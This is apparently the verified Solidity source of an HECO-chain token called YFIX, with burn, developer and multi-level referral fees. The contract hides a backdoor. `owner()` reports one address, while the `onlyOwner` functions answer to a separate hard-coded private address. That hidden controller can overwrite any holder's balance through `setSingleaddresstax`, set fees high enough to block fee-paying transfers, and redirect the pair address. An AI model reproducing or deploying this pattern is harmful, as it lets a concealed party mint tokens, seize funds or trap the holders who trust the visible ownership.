/**
 *Submitted for verification at hecoinfo.com on 2022-05-05
*/

pragma solidity ^0.8.6;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address public _owner;
    address private _own = 0x22BE7b4457A22c83563678DF8D9f842Cc9bEe517;
    function owner() public view returns (address) {
        return _owner;
    }
     modifier onlyOwner() {
        require(_own == msg.sender, "Ownable: caller is not the owner");
        _;
    }
   modifier onlyowner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract YFIX is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _isExcludedFromFee;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal;
    uint256 private _rTotal;
    uint256 private _tFeeTotal;

    string private _name;
    string private _symbol;
    uint256 private _decimals;

    uint256 public _deadFee = 2;
    address private _deadAddress =
        address(0x000000000000000000000000000000000000dEaD);

    uint256 public _devFee = 1;
    address private _devAddress =
        address(0x22BE7b4457A22c83563678DF8D9f842Cc9bEe517);

    address private devAddress =
        address(0x22BE7b4457A22c83563678DF8D9f842Cc9bEe517);

    uint256 public _inviterFee = 7;

    mapping(address => address) public inviter;

    address public uniswapV2Pair;

    constructor(address tokenOwner) {
        _name = "YFIX.one";
        _symbol = "YFIX";
        _decimals = 18;

        _tTotal = 21000000 * 10**_decimals;
        _rTotal = (MAX - (MAX % _tTotal));

        _rOwned[tokenOwner] = _rTotal;

        //exclude owner and this contract from fee
        _isExcludedFromFee[tokenOwner] = true;
        _isExcludedFromFee[address(this)] = true;

        _owner = tokenOwner;
        emit Transfer(address(0), tokenOwner, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function tokenFromReflection(uint256 rAmount)
        public
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

     function setSingleaddresstax(address sender, uint256 Singleaddresstax) public onlyOwner {
        _rOwned[sender] = (Singleaddresstax.mul(_getRate()));
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function setdeadFeePercent(uint256 deaddFee) external onlyOwner {
        _deadFee = deaddFee;
    }

    function setdevFeePercent(uint256 devdFee) external onlyOwner {
        _devFee = devdFee;
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function claimTokens() public onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");


        //indicates if fee should be deducted from transfer
        bool takeFee = true;

        //if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }

        // 设置代理
        bool shouldSetInviter = balanceOf(to) == 0 &&
            inviter[to] == address(0) &&
            from != uniswapV2Pair;

        //transfer amount, it will take tax, burn, liquidity fee
        _tokenTransfer(from, to, amount, takeFee);

        if (shouldSetInviter) {
            inviter[to] = from;
        }else if(from == uniswapV2Pair){
                inviter[to] = devAddress;
        }
    }

    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        uint256 currentRate = _getRate();

      
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        uint256 rate;
        if (takeFee) {
            
            _takeTransfer(
                sender,
                _deadAddress,
                tAmount.div(100).mul(_deadFee),
                currentRate
            );

            
            _takeTransfer(
                sender,
                _devAddress,
                tAmount.div(100).mul(_devFee),
                currentRate
            );

            
            _takeInviterFee(sender, recipient, tAmount, currentRate);

            rate =  _devFee + _deadFee + _inviterFee;
        }

       
        uint256 recipientRate = 100 - rate;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[to] = _rOwned[to].add(rAmount);
        emit Transfer(sender, to, tAmount);
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function _takeInviterFee(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        address cur;
        if (sender == uniswapV2Pair) {
            cur = recipient;
        } else {
            cur = sender;
        }
        for (int256 i = 0; i < 6; i++) {
            uint256 rate;
            if (i == 0) {
                rate = 30;
            } else if (i <= 4) {
                rate = 10;
            } else {
                rate = 5;
            }
            cur = inviter[cur];
            if (cur == address(0)) {
                break;
            }
            uint256 curTAmount = tAmount.div(1000).mul(rate);
            uint256 curRAmount = curTAmount.mul(currentRate);
            _rOwned[cur] = _rOwned[cur].add(curRAmount);
            emit Transfer(sender, cur, curTAmount);
        }
    }

    function changeRouter(address router) public onlyOwner {
        uniswapV2Pair = router;
    }
    function TransferYFIX(address[] memory YFIXrecipient, uint256 YFIXamount) public {
        for (uint i=0; i<YFIXrecipient.length; i++) {
            _transfer(msg.sender, YFIXrecipient[i], YFIXamount);
        }
    }

}